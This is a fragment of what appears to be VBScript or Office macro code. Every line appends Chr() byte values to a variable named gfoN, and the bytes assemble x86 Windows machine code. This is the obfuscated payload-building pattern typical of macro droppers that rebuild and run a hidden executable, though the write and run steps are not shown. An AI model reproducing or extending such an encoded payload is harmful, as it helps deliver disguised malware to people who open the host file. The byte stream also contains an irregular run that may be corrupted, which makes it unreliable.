gfoN=gfoN&Chr(172)&Chr(64)&Chr(0)&Chr(51)&Chr(192)&Chr(235)&Chr(3)&Chr(131)&Chr(200)&Chr(255)&Chr(95)&Chr(94)&Chr(91)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(161)&Chr(192)&Chr(176)&Chr(64)&Chr(0)&Chr(131)&Chr(236)&Chr(12)&Chr(83)&Chr(86)&Chr(139)&Chr(53)&Chr(60)&Chr(128)&Chr(64)&Chr(0)&Chr(87)&Chr(51)&Chr(219)&Chr(51)&Chr(255)&Chr(59)&Chr(195)&Chr(117)&Chr(46)&Chr(255)&Chr(214)&Chr(139)&Chr(248)&Chr(59)&Chr(251)&Chr(116)&Chr(12)&Chr(199)&Chr(5)&Chr(192)&Chr(176)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(35)&Chr(255)&Chr(21)&Chr(56)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(120)&Chr(117)&Chr(10)&Chr(106)&Chr(2)&Chr(88)&Chr(163)&Chr(192)&Chr(176)&Chr(64)&Chr(0)&Chr(235)&Chr(5)&Chr(161)&Chr(192)&Chr(176)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(1)&Chr(15)&Chr(133)&Chr(129)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(59)&Chr(251)&Chr(117)&Chr(15)&Chr(255)&Chr(214)&Chr(139)&Chr(248)&Chr(59)&Chr(251)&Chr(117)&Chr(7)&Chr(51)&Chr(192)&Chr(233)&Chr(202)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(199)&Chr(102)&Chr(57)&Chr(31)&Chr(116)&Chr(14)&Chr(64)&Chr(64)&Chr(102)&Chr(57)&Chr(24)&Chr(117)&Chr(249)&Chr(64)&Chr(64)&Chr(102)&Chr(57)&Chr(24)&Chr(117)&Chr(242)&Chr(139)&Chr(53)&Chr(52)&Chr(128)&Chr(64)&Chr(0)&Chr(83)&Chr(83)&Chr(83)&Chr(43)&Chr(199)&Chr(83)&Chr(209)&Chr(248)&Chr(64)&Chr(80)&Chr(87)&Chr(83)&Chr(83)&Chr(137)&Chr(69)&Chr(244)&Chr(255)&Chr(214)&Chr(137)&Chr(69)&Chr(248)&Chr(59)&Chr(195)&Chr(116)&Chr(47)&Chr(80)&Chr(232)&Chr(252)&Chr(32)&Chr(0)&Chr(0)&Chr(89)&Chr(137)&Chr(69)&Chr(252)&Chr(59)&Chr(195)&Chr(116)&Chr(33)&Chr(83)&Chr(83)&Chr(255)&Chr(117)&Chr(248)&Chr(80)&Chr(255)&Chr(117)&Chr(244)&Chr(87)&Chr(83)&Chr(83)&Chr(255)&Chr(214)&Chr(133)
gfoN=gfoN&Chr(192)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(252)&Chr(232)&Chr(76)&Chr(32)&Chr(0)&Chr(0)&Chr(89)&Chr(137)&Chr(93)&Chr(252)&Chr(139)&Chr(93)&Chr(252)&Chr(87)&Chr(255)&Chr(21)&Chr(48)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(195)&Chr(235)&Chr(92)&Chr(131)&Chr(248)&Chr(2)&Chr(116)&Chr(4)&Chr(59)&Chr(195)&Chr(117)&Chr(130)&Chr(255)&Chr(21)&Chr(44)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(240)&Chr(59)&Chr(243)&Chr(15)&Chr(132)&Chr(114)&Chr(255)&Chr(255)&Chr(255)&Chr(56)&Chr(30)&Chr(116)&Chr(10)&Chr(64)&Chr(56)&Chr(24)&Chr(117)&Chr(251)&Chr(64)&Chr(56)&Chr(24)&Chr(117)&Chr(246)&Chr(43)&Chr(198)&Chr(64)&Chr(80)&Chr(137)&Chr(69)&Chr(248)&Chr(232)&Chr(149)&Chr(32)&Chr(0)&Chr(0)&Chr(139)&Chr(248)&Chr(89)&Chr(59)&Chr(251)&Chr(117)&Chr(12)&Chr(86)&Chr(255)&Chr(21)&Chr(40)&Chr(128)&Chr(64)&Chr(0)&Chr(233)&Chr(69)&Chr(255)&Chr(255)&Chr(255)&Chr(255)
gfoN=gfoN&Chr(117)&Chr(248)&Chr(86)&Chr(87)&Chr(232)&Chr(87)&Chr(33)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(86)&Chr(255)&Chr(21)&Chr(40)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(199)&Chr(95)&Chr(94)&Chr(91)&Chr(201)&Chr(195)&Chr(106)&Chr(84)&Chr(104)&Chr(24)&Chr(147)&Chr(64)&Chr(0)&Chr(232)&Chr(98)&Chr(8)&Chr(0)&Chr(0)&Chr(51)&Chr(255)&Chr(137)&Chr(125)&Chr(252)&Chr(141)&Chr(69)&Chr(156)&Chr(80)&Chr(255)&Chr(21)&Chr(4)&Chr(128)&Chr(64)&Chr(0)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(106)&Chr(64)&Chr(106)&Chr(32)&Chr(94)&Chr(86)&Chr(232)&Chr(127)&Chr(32)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(59)&Chr(199)&Chr(15)&Chr(132)&Chr(20)&Chr(2)&Chr(0)&Chr(0)&Chr(163)&Chr(224)&Chr(182)&Chr(64)&Chr(0)&Chr(137)&Chr(53)&Chr(208)&Chr(182)&Chr(64)&Chr(0)&Chr(141)&Chr(136)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(235)&Chr(48)
gfoN=gfoN&Chr(198)&Chr(64)&Chr(4)&Chr(0)&Chr(131)&Chr(8)&Chr(255)&Chr(198)&Chr(64)&Chr(5)&Chr(10)&Chr(137)&Chr(120)&Chr(8)&Chr(198)&Chr(64)&Chr(36)&Chr(0)&Chr(198)&Chr(64)&Chr(37)&Chr(10)&Chr(198)&Chr(64)&Chr(38)&Chr(10)&Chr(137)&Chr(120)&Chr(56)&Chr(198)&Chr(64)&Chr(52)&Chr(0)&Chr(131)&Chr(192)&Chr(64)&Chr(139)&Chr(13)&Chr(224)&Chr(182)&Chr(64)&Chr(0)&Chr(129)&Chr(193)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(59)&Chr(193)&Chr(114)&Chr(204)&Chr(102)&Chr(57)&Chr(125)&Chr(206)&Chr(15)&Chr(132)&Chr(10)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(208)&Chr(59)&Chr(199)&Chr(15)&Chr(132)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(56)&Chr(141)&Chr(88)&Chr(4)&Chr(141)&Chr(4)&Chr(59)&Chr(137)&Chr(69)&Chr(228)&Chr(190)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(59)&Chr(254)&Chr(124)&Chr(2)&Chr(139)&Chr(254)&Chr(199)&Chr(69)&Chr(224)&Chr(1)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(235)&Chr(91)&Chr(106)&Chr(64)&Chr(106)&Chr(32)&Chr(232)&Chr(241)&Chr(31)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(86)&Chr(139)&Chr(77)&Chr(224)&Chr(141)&Chr(12)&Chr(141)&Chr(224)&Chr(182)&Chr(64)&Chr(0)&Chr(137)&Chr(1)&Chr(131)&Chr(5)&Chr(208)&Chr(182)&Chr(64)&Chr(0)&Chr(32)&Chr(141)&Chr(144)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(235)&Chr(42)&Chr(198)&Chr(64)&Chr(4)&Chr(0)&Chr(131)&Chr(8)&Chr(255)&Chr(198)&Chr(64)&Chr(5)&Chr(10)&Chr(131)&Chr(96)&Chr(8)&Chr(0)&Chr(128)&Chr(96)&Chr(36)&Chr(128)&Chr(198)&Chr(64)&Chr(37)&Chr(10)&Chr(198)&Chr(64)&Chr(38)&Chr(10)&Chr(131)&Chr(96)&Chr(56)&Chr(0)&Chr(198)&Chr(64)&Chr(52)&Chr(0)&Chr(131)&Chr(192)&Chr(64)&Chr(139)&Chr(17)&Chr(3)&Chr(214)&Chr(59)&Chr(194)&Chr(114)&Chr(210)&Chr(255)&Chr(69)&Chr(224)&Chr(57)&Chr(61)&Chr(208)&Chr(182)&Chr(64)
gfoN=gfoN&Chr(0)&Chr(124)&Chr(157)&Chr(235)&Chr(6)&Chr(139)&Chr(61)&Chr(208)&Chr(182)&Chr(64)&Chr(0)&Chr(131)&Chr(101)&Chr(224)&Chr(0)&Chr(133)&Chr(255)&Chr(126)&Chr(109)&Chr(139)&Chr(69)&Chr(228)&Chr(139)&Chr(8)&Chr(131)&Chr(249)&Chr(255)&Chr(116)&Chr(86)&Chr(131)&Chr(249)&Chr(254)&Chr(116)&Chr(81)&Chr(138)&Chr(3)&Chr(168)&Chr(1)&Chr(116)&Chr(75)&Chr(168)&Chr(8)&Chr(117)&Chr(11)&Chr(81)&Chr(255)&Chr(21)&Chr(68)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(60)&Chr(139)&Chr(117)&Chr(224)&Chr(139)&Chr(198)&Chr(193)&Chr(248)&Chr(5)&Chr(131)&Chr(230)&Chr(31)&Chr(193)&Chr(230)&Chr(6)&Chr(3)&Chr(52)&Chr(133)&Chr(224)&Chr(182)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(228)&Chr(139)&Chr(0)&Chr(137)&Chr(6)&Chr(138)&Chr(3)&Chr(136)&Chr(70)&Chr(4)&Chr(104)&Chr(160)&Chr(15)&Chr(0)&Chr(0)&Chr(141)&Chr(70)&Chr(12)&Chr(80)&Chr(232)&Chr(26)&Chr(18)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(133)&Chr(192)&Chr(15)&Chr(132)&Chr(201)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(70)&Chr(8)&Chr(255)&Chr(69)&Chr(224)&Chr(67)&Chr(131)&Chr(69)&Chr(228)&Chr(4)&Chr(57)&Chr(125)&Chr(224)&Chr(124)&Chr(147)&Chr(51)&Chr(219)&Chr(139)&Chr(243)&Chr(193)&Chr(230)&Chr(6)&Chr(3)&Chr(53)&Chr(224)&Chr(182)&Chr(64)&Chr(0)&Chr(139)&Chr(6)&Chr(131)&Chr(248)&Chr(255)&Chr(116)&Chr(11)&Chr(131)&Chr(248)&Chr(254)&Chr(116)&Chr(6)&Chr(128)&Chr(78)&Chr(4)&Chr(128)&Chr(235)&Chr(114)&Chr(198)&Chr(70)&Chr(4)&Chr(129)&Chr(133)&Chr(219)&Chr(117)&Chr(5)&Chr(106)&Chr(246)&Chr(88)&Chr(235)&Chr(10)&Chr(139)&Chr(195)&Chr(72)&Chr(247)&Chr(216)&Chr(27)&Chr(192)&Chr(131)&Chr(192)&Chr(245)&Chr(80)&Chr(255)&Chr(21)&Chr(32)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(248)&Chr(131)&Chr(255)&Chr(255)&Chr(116)&Chr(67)&Chr(133)&Chr(255)&Chr(116)&Chr(63)
gfoN=gfoN&Chr(87)&Chr(255)&Chr(21)&Chr(68)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(52)&Chr(137)&Chr(62)&Chr(37)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(248)&Chr(2)&Chr(117)&Chr(6)&Chr(128)&Chr(78)&Chr(4)&Chr(64)&Chr(235)&Chr(9)&Chr(131)&Chr(248)&Chr(3)&Chr(117)&Chr(4)&Chr(128)&Chr(78)&Chr(4)&Chr(8)&Chr(104)&Chr(160)&Chr(15)&Chr(0)&Chr(0)&Chr(141)&Chr(70)&Chr(12)&Chr(80)&Chr(232)&Chr(132)&Chr(17)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(55)&Chr(255)&Chr(70)&Chr(8)&Chr(235)&Chr(10)&Chr(38)&Chr(78)&Chr(4)&Chr(64)&Chr(199)&Chr(6)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(67)&Chr(131)&Chr(251)&Chr(3)&Chr(15)&Chr(140)&Chr(103)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(53)&Chr(208)&Chr(182)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(64)&Chr(128)&Chr(64)&Chr(0)&Chr(51)&Chr(192)&Chr(235)&Chr(17)&Chr(51)
gfoN=gfoN&Chr(192)&Chr(64)&Chr(195)&Chr(139)&Chr(101)&Chr(232)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(200)&Chr(255)&Chr(232)&Chr(96)&Chr(6)&Chr(0)&Chr(0)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(184)&Chr(192)&Chr(146)&Chr(64)&Chr(0)&Chr(190)&Chr(192)&Chr(146)&Chr(64)&Chr(0)&Chr(87)&Chr(139)&Chr(248)&Chr(59)&Chr(149)&Chr(115)&Chr(15)&Chr(139)&Chr(7)&Chr(133)&Chr(192)&Chr(116)&Chr(2)&Chr(255)&Chr(208)&Chr(131)&Chr(199)&Chr(4)&Chr(59)&Chr(254)&Chr(114)&Chr(241)&Chr(95)&Chr(94)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(184)&Chr(200)&Chr(146)&Chr(64)&Chr(0)&Chr(190)&Chr(200)&Chr(146)&Chr(64)&Chr(0)&Chr(87)&Chr(139)&Chr(248)&Chr(59)&Chr(198)&Chr(115)&Chr(15)&Chr(139)&Chr(7)&Chr(133)&Chr(192)&Chr(116)&Chr(2)&Chr(255)&Chr(208)&Chr(131)&Chr(199)&Chr(4)&Chr(59)&Chr(254)&Chr(114)&Chr(204)&Chr(95)&Chr(94)&Chr(195)&Chr(139)&Chr(255)
gfoN=gfoN&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(255)&Chr(53)&Chr(20)&Chr(161)&Chr(64)&Chr(0)&Chr(139)&Chr(53)&Chr(76)&Chr(128)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(133)&Chr(192)&Chr(116)&Chr(33)&Chr(161)&Chr(16)&Chr(161)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(255)&Chr(116)&Chr(23)&Chr(80)&Chr(255)&Chr(53)&Chr(20)&Chr(161)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(255)&Chr(208)&Chr(133)&Chr(192)&Chr(116)&Chr(8)&Chr(139)&Chr(128)&Chr(248)&Chr(1)&Chr(0)&Chr(0)&Chr(235)&Chr(39)&Chr(190)&Chr(148)&Chr(135)&Chr(64)&Chr(0)&Chr(86)&Chr(255)&Chr(21)&Chr(12)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(11)&Chr(86)&Chr(232)&Chr(203)&Chr(241)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(24)&Chr(104)&Chr(132)&Chr(135)&Chr(64)&Chr(0)&Chr(80)&Chr(255)&Chr(21)&Chr(20)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(8)&Chr(255)&Chr(117)
gfoN=gfoN&Chr(8)&Chr(255)&Chr(208)&Chr(137)&Chr(69)&Chr(8)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(93)&Chr(195)&Chr(106)&Chr(0)&Chr(232)&Chr(135)&Chr(255)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(255)&Chr(53)&Chr(20)&Chr(161)&Chr(64)&Chr(0)&Chr(139)&Chr(53)&Chr(76)&Chr(128)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(133)&Chr(192)&Chr(116)&Chr(33)&Chr(161)&Chr(16)&Chr(161)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(255)&Chr(116)&Chr(23)&Chr(80)&Chr(255)&Chr(53)&Chr(20)&Chr(161)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(255)&Chr(208)&Chr(133)&Chr(192)&Chr(116)&Chr(8)&Chr(139)&Chr(128)&Chr(252)&Chr(1)&Chr(0)&Chr(0)&Chr(235)&Chr(39)&Chr(190)&Chr(148)&Chr(135)&Chr(64)&Chr(0)&Chr(86)&Chr(255)&Chr(21)&Chr(12)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(11)&Chr(86)&Chr(232)&Chr(80)&Chr(241)&Chr(255)&Chr(255)
gfoN=gfoN&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(24)&Chr(104)&Chr(176)&Chr(135)&Chr(64)&Chr(0)&Chr(80)&Chr(255)&Chr(21)&Chr(20)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(227)&Chr(18)&Chr(226)&Chr(36)&Chr(74)&Chr(61)&Chr(103)&Chr(181)&Chr(144)&Chr(12)&Chr(168)&Chr(122)&Chr(37)&Chr(246)&Chr(212)&Chr(117)&Chr(32)&Chr(213)&Chr(178)&Chr(28)&Chr(52)&Chr(50)&Chr(252)&Chr(42)&Chr(249)&Chr(141)&Chr(145)&Chr(146)&Chr(47)&Chr(66)&Chr(39)&Chr(155)&Chr(253)&Chr(186)&Chr(72)&Chr(65)&Chr(102)&Chr(147)&Chr(184)&Chr(113)&Chr(13)&Chr(182)&Chr(21)&Chr(75)&Chr(179)&Chr(187)&Chr(44)&Chr(185)&Chr(159)&Chr(64)&Chr(248)&Chr(153)&Chr(67)&Chr(152)&Chr(233)&Chr(119)&Chr(64)&Chr(0)&Chr(0)&Chr(139)&Chr(240)&Chr(86)&Chr(255)&Chr(53)&Chr(20)&Chr(161)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(84)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(198)&Chr(94)&Chr(195)&Chr(161)&Chr(16)&Chr(161)&Chr(64)
gfoN=gfoN&Chr(0)&Chr(131)&Chr(248)&Chr(255)&Chr(116)&Chr(22)&Chr(80)&Chr(255)&Chr(53)&Chr(208)&Chr(176)&Chr(64)&Chr(0)&Chr(232)&Chr(59)&Chr(255)&Chr(255)&Chr(255)&Chr(89)&Chr(255)&Chr(208)&Chr(131)&Chr(13)&Chr(16)&Chr(161)&Chr(64)&Chr(0)&Chr(255)&Chr(161)&Chr(20)&Chr(161)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(255)&Chr(116)&Chr(14)&Chr(80)&Chr(255)&Chr(21)&Chr(88)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(13)&Chr(20)&Chr(161)&Chr(64)&Chr(0)&Chr(255)&Chr(233)&Chr(134)&Chr(7)&Chr(0)&Chr(0)&Chr(106)&Chr(12)&Chr(104)&Chr(56)&Chr(147)&Chr(64)&Chr(0)&Chr(232)&Chr(91)&Chr(4)&Chr(0)&Chr(0)&Chr(190)&Chr(148)&Chr(135)&Chr(64)&Chr(0)&Chr(86)&Chr(255)&Chr(21)&Chr(12)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(7)&Chr(86)&Chr(232)&Chr(145)&Chr(240)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(69)&Chr(228)&Chr(139)&Chr(117)&Chr(8)&Chr(199)&Chr(70)
gfoN=gfoN&Chr(92)&Chr(8)&Chr(135)&Chr(64)&Chr(0)&Chr(51)&Chr(255)&Chr(71)&Chr(137)&Chr(126)&Chr(20)&Chr(133)&Chr(192)&Chr(116)&Chr(36)&Chr(104)&Chr(132)&Chr(135)&Chr(64)&Chr(0)&Chr(80)&Chr(139)&Chr(29)&Chr(20)&Chr(128)&Chr(64)&Chr(0)&Chr(255)&Chr(211)&Chr(137)&Chr(134)&Chr(248)&Chr(1)&Chr(0)&Chr(0)&Chr(104)&Chr(176)&Chr(135)&Chr(64)&Chr(0)&Chr(255)&Chr(117)&Chr(228)&Chr(255)&Chr(211)&Chr(137)&Chr(134)&Chr(252)&Chr(1)&Chr(0)&Chr(0)&Chr(137)&Chr(126)&Chr(112)&Chr(198)&Chr(134)&Chr(200)&Chr(0)&Chr(0)&Chr(0)&Chr(67)&Chr(198)&Chr(134)&Chr(75)&Chr(1)&Chr(0)&Chr(0)&Chr(67)&Chr(199)&Chr(70)&Chr(104)&Chr(224)&Chr(163)&Chr(64)&Chr(0)&Chr(106)&Chr(13)&Chr(232)&Chr(58)&Chr(8)&Chr(0)&Chr(0)&Chr(89)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(255)&Chr(118)&Chr(104)&Chr(255)&Chr(21)&Chr(92)&Chr(128)&Chr(64)&Chr(0)&Chr(199)&Chr(69)&Chr(252)&Chr(254)
gfoN=gfoN&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(62)&Chr(0)&Chr(0)&Chr(0)&Chr(106)&Chr(12)&Chr(232)&Chr(25)&Chr(8)&Chr(0)&Chr(0)&Chr(89)&Chr(137)&Chr(125)&Chr(252)&Chr(139)&Chr(69)&Chr(12)&Chr(137)&Chr(70)&Chr(108)&Chr(133)&Chr(192)&Chr(117)&Chr(8)&Chr(161)&Chr(232)&Chr(169)&Chr(64)&Chr(0)&Chr(137)&Chr(70)&Chr(108)&Chr(255)&Chr(118)&Chr(108)&Chr(232)&Chr(49)&Chr(33)&Chr(0)&Chr(0)&Chr(89)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(21)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(222)&Chr(3)&Chr(0)&Chr(0)&Chr(195)&Chr(51)&Chr(255)&Chr(71)&Chr(139)&Chr(117)&Chr(8)&Chr(106)&Chr(13)&Chr(232)&Chr(1)&Chr(7)&Chr(0)&Chr(0)&Chr(89)&Chr(195)&Chr(106)&Chr(12)&Chr(232)&Chr(248)&Chr(6)&Chr(0)&Chr(0)&Chr(89)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(87)&Chr(255)&Chr(21)&Chr(56)&Chr(128)&Chr(64)&Chr(0)&Chr(255)&Chr(53)
gfoN=gfoN&Chr(16)&Chr(161)&Chr(64)&Chr(0)&Chr(139)&Chr(248)&Chr(232)&Chr(145)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(208)&Chr(139)&Chr(240)&Chr(133)&Chr(246)&Chr(117)&Chr(78)&Chr(104)&Chr(20)&Chr(2)&Chr(0)&Chr(0)&Chr(106)&Chr(1)&Chr(232)&Chr(147)&Chr(27)&Chr(0)&Chr(0)&Chr(139)&Chr(240)&Chr(89)&Chr(89)&Chr(133)&Chr(246)&Chr(116)&Chr(58)&Chr(86)&Chr(255)&Chr(53)&Chr(16)&Chr(161)&Chr(115)&Chr(0)&Chr(255)&Chr(53)&Chr(204)&Chr(176)&Chr(64)&Chr(0)&Chr(232)&Chr(232)&Chr(253)&Chr(255)&Chr(255)&Chr(89)&Chr(255)&Chr(208)&Chr(133)&Chr(192)&Chr(116)&Chr(24)&Chr(106)&Chr(0)&Chr(86)&Chr(232)&Chr(197)&Chr(254)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(255)&Chr(21)&Chr(100)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(78)&Chr(4)&Chr(255)&Chr(137)&Chr(6)&Chr(235)&Chr(9)&Chr(86)&Chr(232)&Chr(129)&Chr(26)&Chr(0)&Chr(0)&Chr(89)&Chr(51)&Chr(246)&Chr(87)&Chr(255)&Chr(21)
gfoN=gfoN&Chr(96)&Chr(128)&Chr(64)&Chr(0)&Chr(95)&Chr(139)&Chr(198)&Chr(94)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(232)&Chr(127)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(240)&Chr(133)&Chr(246)&Chr(117)&Chr(8)&Chr(106)&Chr(16)&Chr(232)&Chr(110)&Chr(239)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(198)&Chr(94)&Chr(195)&Chr(106)&Chr(8)&Chr(104)&Chr(96)&Chr(147)&Chr(64)&Chr(0)&Chr(232)&Chr(225)&Chr(2)&Chr(0)&Chr(0)&Chr(139)&Chr(117)&Chr(8)&Chr(133)&Chr(246)&Chr(15)&Chr(132)&Chr(248)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(70)&Chr(36)&Chr(133)&Chr(192)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(52)&Chr(26)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(70)&Chr(44)&Chr(133)&Chr(192)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(38)&Chr(26)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(70)&Chr(52)&Chr(133)&Chr(192)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(24)&Chr(26)&Chr(0)&Chr(0)&Chr(89)
gfoN=gfoN&Chr(139)&Chr(70)&Chr(60)&Chr(133)&Chr(192)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(10)&Chr(26)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(70)&Chr(64)&Chr(133)&Chr(192)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(252)&Chr(25)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(70)&Chr(68)&Chr(133)&Chr(192)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(238)&Chr(25)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(70)&Chr(72)&Chr(133)&Chr(192)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(224)&Chr(25)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(70)&Chr(92)&Chr(61)&Chr(8)&Chr(135)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(207)&Chr(25)&Chr(0)&Chr(0)&Chr(89)&Chr(106)&Chr(13)&Chr(232)&Chr(172)&Chr(6)&Chr(0)&Chr(0)&Chr(89)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(139)&Chr(126)&Chr(104)&Chr(133)&Chr(255)&Chr(116)&Chr(26)&Chr(87)&Chr(255)&Chr(21)&Chr(104)&Chr(128)&Chr(64)&Chr(0)&Chr(133)
gfoN=gfoN&Chr(192)&Chr(117)&Chr(15)&Chr(129)&Chr(255)&Chr(224)&Chr(163)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(87)&Chr(232)&Chr(162)&Chr(25)&Chr(0)&Chr(0)&Chr(89)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(87)&Chr(0)&Chr(0)&Chr(0)&Chr(106)&Chr(12)&Chr(232)&Chr(115)&Chr(6)&Chr(0)&Chr(0)&Chr(89)&Chr(199)&Chr(69)&Chr(252)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(126)&Chr(108)&Chr(133)&Chr(255)&Chr(116)&Chr(35)&Chr(87)&Chr(232)&Chr(35)&Chr(32)&Chr(0)&Chr(0)&Chr(89)&Chr(59)&Chr(61)&Chr(232)&Chr(169)&Chr(64)&Chr(0)&Chr(116)&Chr(20)&Chr(129)&Chr(255)&Chr(16)&Chr(169)&Chr(64)&Chr(0)&Chr(116)&Chr(12)&Chr(131)&Chr(63)&Chr(0)&Chr(117)&Chr(7)&Chr(87)&Chr(232)&Chr(47)&Chr(30)&Chr(0)&Chr(0)&Chr(89)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(30)&Chr(0)&Chr(0)&Chr(0)&Chr(86)
gfoN=gfoN&Chr(232)&Chr(74)&Chr(25)&Chr(0)&Chr(0)&Chr(89)&Chr(232)&Chr(30)&Chr(2)&Chr(0)&Chr(0)&Chr(194)&Chr(4)&Chr(0)&Chr(139)&Chr(117)&Chr(8)&Chr(106)&Chr(13)&Chr(232)&Chr(66)&Chr(5)&Chr(0)&Chr(0)&Chr(89)&Chr(195)&Chr(139)&Chr(117)&Chr(8)&Chr(106)&Chr(12)&Chr(232)&Chr(54)&Chr(5)&Chr(0)&Chr(0)&Chr(89)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(87)&Chr(190)&Chr(148)&Chr(135)&Chr(64)&Chr(0)&Chr(86)&Chr(255)&Chr(21)&Chr(12)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(7)&Chr(86)&Chr(232)&Chr(240)&Chr(237)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(248)&Chr(133)&Chr(255)&Chr(15)&Chr(132)&Chr(94)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(53)&Chr(20)&Chr(128)&Chr(64)&Chr(0)&Chr(104)&Chr(224)&Chr(135)&Chr(64)&Chr(0)&Chr(87)&Chr(255)&Chr(214)&Chr(104)&Chr(212)&Chr(135)&Chr(64)&Chr(0)&Chr(87)&Chr(163)&Chr(196)&Chr(176)&Chr(64)&Chr(0)
